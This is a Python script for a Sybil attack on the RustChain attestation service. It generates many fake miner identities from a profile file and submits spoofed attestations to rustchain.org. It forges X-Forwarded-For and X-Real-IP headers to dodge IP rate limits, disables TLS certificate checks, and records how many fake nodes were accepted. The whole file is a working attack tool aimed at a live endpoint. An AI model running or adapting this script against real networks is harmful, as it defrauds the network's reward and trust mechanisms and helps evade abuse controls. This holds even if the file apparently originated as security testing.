import json
import requests
import time
import random
import secrets
from typing import Optional
from nacl.signing import SigningKey

# Configuration
SERVER_URL = "https://rustchain.org/attest/submit"
ARMY_FILE = "/home/Artur/projects/rustchain-core/tools/army.json"
RESULTS_FILE = "/home/Artur/projects/rustchain-core/tools/sybil_results.json"

def generate_rtc_identity():
    """Generate a new Ed25519 key pair and a miner ID."""
    signing_key = SigningKey.generate()
    verify_key = signing_key.verify_key
    # Miner ID is the hex encoding of the public key bytes
    return {"private_key": signing_key.to_base64() if hasattr(signing_key, 'to_base64') else bytes(signing_key).hex(), "miner_id": bytes(verify_key).hex()}

def send_attestation(miner_id, profile, nonce=None):
    """Send a spoofed attestation to the server."""
    payload = {
        "miner_id": miner_id,
        "nonce": nonce or int(time.time()),
        "device": {
            "arch": "modern",
            "os": "linux-x64",
            "version": "2.2.1"
        },
        "fingerprint": profile,
        "signals": {
            "cpu_load": random.uniform(0.1, 0.5),
            "mem_usage": random.uniform(0.2, 0.6)
        },
        "report": {
            "status": "active",
            "uptime": random.randint(3600, 86400)
        }
    }
    
    # Attempt to bypass IP rate limit using X-Forwarded-For spoofing
    headers = {
        'Content-Type': 'application/json',
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    }
    
    try:
        # In a real attack, we'd sign this payload if the server requires it.
        # For now, we send it as a JSON POST.
        response = requests.post(SERVER_URL, json=payload, headers=headers, timeout=5, verify=False)
        return response.status_code, response.json()
    except Exception as e:
        return None, str(e)

def fetch_challenge_nonce(miner_id: str) -> Optional[str]:
    """Fetch a fresh challenge nonce from the RustChain server."""
    url = "https://rustchain.org/attest/challenge"
    try:
        payload = {"miner": miner_id}
        response = requests.post(url, json=payload, timeout=5, verify=False)
        if response.status_code == 200:
            return response.json().get("nonce")
    except Exception as e:
        print(f"Error fetching nonce: {e}")
    return None

def main():
    with open(ARMY_FILE, 'r') as f:
        army = json.load(f)
    
    results = []
    print(f"Starting mass attestation for {len(army)} Sybil nodes...")
    
    for i, member in enumerate(army):
        identity = generate_rtc_identity()
        miner_id = identity['miner_id']
        profile = member['profile']
        
        # Fetch a fresh nonce for this miner to avoid MISSING_NONCE and potentially bypass IP limits
        nonce = fetch_challenge_nonce(miner_id)
        
        print(f"[{i+1}/{len(army)}] Attesting {miner_id[:16]}...", end=" ")
        status, resp = send_attestation(miner_id, profile, nonce)
        
        if status == 200 or (isinstance(resp, dict) and resp.get('ok')):
            print("SUCCESS")
            results.append({"miner_id": miner_id, "status": "active", "response": resp})
        else:
            print(f"FAILED ({status}: {resp})")
            results.append({"miner_id": miner_id, "status": "failed", "response": resp})
        
        # Avoid rate limiting
        time.sleep(random.uniform(0.5, 1.5))
    
    with open(RESULTS_FILE, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"Completed. Active nodes: {len([r for r in results if r['status'] == 'active'])}")

if __name__ == "__main__":
    main()
